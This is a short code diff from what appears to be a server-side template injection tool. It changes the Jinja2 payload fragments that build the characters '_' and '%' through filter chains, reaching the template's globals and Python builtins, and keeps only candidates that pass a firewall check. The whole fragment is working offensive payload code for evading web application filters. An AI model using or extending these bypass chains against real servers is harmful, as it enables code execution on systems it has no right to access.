@@ -18,11 +18,11 @@ def get_int_context(waf_func):
 
 def get_str_context(waf_func):
     str_vars = [
-        ("un", "_", "{%set un=(lipsum|escape|batch(22)|list|first|last)%}"),
-        ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
-         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
-         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
-         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}"),
+        ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
+        ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
+         "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
+         "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
+         "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
         # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
     ]
     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
